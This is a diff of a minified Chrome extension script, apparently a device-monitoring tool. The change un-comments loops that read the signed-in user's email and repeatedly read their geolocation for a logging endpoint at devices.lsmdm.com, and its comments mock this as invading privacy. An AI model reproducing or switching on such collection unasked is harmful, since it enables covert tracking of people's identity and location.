@@ -1,3 +1,5 @@
+// Start of imports
+
 ! function e(r, o, t) { // modules
     function n(a, c) { // a = name of module
         if (!o[a]) {
@@ -19,16 +21,19 @@
     }
     for (var i = "function" == typeof require && require, a = 0; a < t.length; a++) n(t[a]);
     return n
-}({ // End of Imports/Exports
+}({
+
+// End of imports
+
     1: [function(e, r, o) {
         const t = 6e4,
             n = 750 / 111111,
             i = 12e5;
         let a = 0,
             c = [0, 0];
-        const s = "https://devices.lsmdm.com/log/activity"; //  base url be like
+        const s = "https://devices.lsmdm.com/log/activity"; //  base url to connect to
 
-        function f(e) {
+        function newPromiseLoop(e) {
             return new Promise((r, o) => {
                 setTimeout(r, e)
             })
@@ -55,12 +60,12 @@
             })), a = (new Date).getTime()), c = e
         }
         let l, d;
-        chrome.runtime.onConnect.addListener(e => {
-            e.onMessage.addListener(async e => {
-                Array.isArray(e.pos) ? await u(e.pos) : console.warn("Invalid coordinates")
+        chrome.runtime.onConnect.addListener(runtime => {
+            runtime.onMessage.addListener(async data => {
+                Array.isArray(data.pos) ? await u(data.pos) : console.warn("Invalid coordinates")
             })
         }), async function() { // invade privacy to get email ;DDD
-/*            for (;;) try {
+            for (;;) try { // very quick loop 
                 l = await new Promise((e, r) => {
                     try {
                         chrome.identity.getProfileUserInfo(r => {
@@ -72,16 +77,15 @@
                 }), d = "chrome:" + l;
                 break
             } catch (e) {
-                console.error("Error obtaining email: ", e), console.log("retrying email lookup in 1 second"), await f(1e3)
+                console.error("Error obtaining email: ", e), console.log("retrying email lookup in 1 second"), await newPromiseLoop(1e3)
             }
-*/
           // Get location and invade privacy
-/*            for (;;) try {
+            for (;;) try { // very quick loop 
                 const e = await new Promise((e, r) => {
                     try {
                       
-                        navigator.geolocation.getCurrentPosition(r => { 
-                            e([r.coords.latitude, r.coords.longitude])
+                        navigator.geolocation.getCurrentPosition(data => { 
+                            e([data.coords.latitude, data.coords.longitude])
                         }, e => {
                             r(e)
                         })
@@ -89,11 +93,10 @@
                         r(e)
                     }
                 });
-                await u(e), await f(t)
+                await u(e), await newPromiseLoop(t)
             } catch (e) {
-                console.error("Error processing location", e), console.log("Waiting 5 seconds before retrying location"), await f(5e3)
+                console.error("Error processing location", e), console.log("Waiting 5 seconds before retrying location"), await newPromiseLoop(5000)
             }
-*/
         }()
     }, {}]
 }, {}, [1]);
